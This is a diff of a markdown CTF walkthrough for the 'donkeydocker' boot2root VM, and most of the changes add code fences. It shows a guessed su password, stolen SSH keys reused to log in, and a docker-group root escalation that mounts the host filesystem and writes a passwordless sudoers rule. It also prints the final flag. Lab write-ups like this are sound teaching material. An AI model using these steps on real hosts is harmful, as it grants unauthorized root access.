@@ -115,20 +115,21 @@ Now time to look around to see what may interest us.
 
 So after looking for flags we coudn't find one but when we go to /home/ there
 is a directory named smith, but we do not have the permissions to access him.
+```
 
 drwx------ 1 smith users 4096 Mar 26 10:33 smith
-
+```
 Time for us to take a smoke break and take a step further and see the bigger picture.
 
 Okay so far no luck on finding several hints or clues on several directories, perhaps
 /home/smith is our way to go.
 
 After several tries of accessing smith by using su, the password itself is smith.
-
+```
 smith@12081bd067cc:/www$ whoami
 whoami
 smith
-
+```
 We then find our very first flag ;)
 
 cat flag.txt
@@ -162,7 +163,7 @@ We move to smith's .ssh files here's to some interest (finally)
 -rwx------ 1 smith users  101 Mar 22 04:48 id_ed25519.pub
 ```
 We then copy the ssh keys to our local machine, then ssh our way through.
-
+```
 Welcome to
 
   ___           _            ___          _
@@ -194,20 +195,23 @@ Feedback:    This is my first boot2root - CTF VM, please
 
 Looking forward to the write-ups!
 
-
+```
+```
 donkeydocker:~$ whoami
 orwell
 
 uname -a
 Linux donkeydocker 4.9.17-0-grsec #1-Alpine SMP Thu Mar 23 09:59:13 GMT 2017 x86_64 Linux
+```
 
 Gives us the machine information
 We might have a docker in our hands, says the name itself ;)
 
 Let's see more.
-
+```
 donkeydocker:~$ id
 uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)
+```
 
 Yep we're on group docker.
 
@@ -215,7 +219,7 @@ Now time for us to break out of this container and do some priv esc,
 So far I have not done any priv esc on Docker, let's give it a go!
 
 We played around a bit with Docker.
-
+```
 docker run --privileged --interactive --tty --volume /:/host bash
 bash-4.4# echo "orwell ALL=(ALL) NOPASSWD: ALL" > /host/etc/sudoers.d/foo
 bash-4.4# exit
@@ -225,12 +229,13 @@ donkeydocker:~# hostname
 donkeydocker
 donkeydocker:~# whoami
 root
-
+```
 
 And we got root! Time to find final flag (i think).
 donkeydocker:~# ls
 donkeydocker  flag.txt
 donkeydocker:~# cat flag.txt 
+```
 YES!! You did it :-). Congratulations!
 
 I hope you enjoyed this CTF VM.
@@ -238,6 +243,7 @@ I hope you enjoyed this CTF VM.
 Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw
 
 Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
+```
 ________________________
 END
 ________________________
